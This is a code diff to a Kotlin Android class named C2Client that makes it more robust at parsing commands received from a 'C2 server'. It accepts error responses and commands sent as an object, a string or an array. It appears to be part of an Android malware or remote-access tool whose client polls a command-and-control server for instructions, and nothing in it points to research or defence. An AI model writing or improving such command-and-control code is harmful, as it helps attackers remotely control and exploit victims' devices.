@@ -278,10 +278,47 @@ class C2Client(private val context: Context) {
                 val commands = mutableListOf<String>()
                 try {
                     val jsonResponse = JSONObject(response.toString())
-                    val commandsArray = jsonResponse.getJSONArray("commands")
                     
-                    for (i in 0 until commandsArray.length()) {
-                        commands.add(commandsArray.getString(i))
+                    // Check for error response
+                    if (jsonResponse.has("status") && jsonResponse.getString("status") == "error") {
+                        Log.e(TAG, "Error from C2 server: ${jsonResponse.optString("message", "Unknown error")}")
+                        return emptyList()
+                    }
+                    
+                    // Handle "commands" field that contains either an array or object
+                    if (jsonResponse.has("commands")) {
+                        val commandsObj = jsonResponse.get("commands")
+                        
+                        if (commandsObj is JSONObject) {
+                            // If it's an object, parse each command type
+                            val keys = jsonResponse.getJSONObject("commands").keys()
+                            while (keys.hasNext()) {
+                                val key = keys.next()
+                                commands.add(key)
+                            }
+                        } else if (jsonResponse.get("commands") is String) {
+                            // If it's a string, just add it
+                            commands.add(jsonResponse.getString("commands"))
+                        } else {
+                            // If it's an array, add each command string or parse command objects
+                            val commandsArray = jsonResponse.getJSONArray("commands")
+                            
+                            for (i in 0 until commandsArray.length()) {
+                                try {
+                                    val cmdObj = commandsArray.getJSONObject(i)
+                                    if (cmdObj.has("command")) {
+                                        commands.add(cmdObj.getString("command"))
+                                    }
+                                } catch (e: Exception) {
+                                    // If not a JSON object, try as a string
+                                    try {
+                                        commands.add(commandsArray.getString(i))
+                                    } catch (ex: Exception) {
+                                        Log.e(TAG, "Error parsing command at index $i", ex)
+                                    }
+                                }
+                            }
+                        }
                     }
                 } catch (e: Exception) {
                     Log.e(TAG, "Error parsing commands from response", e)
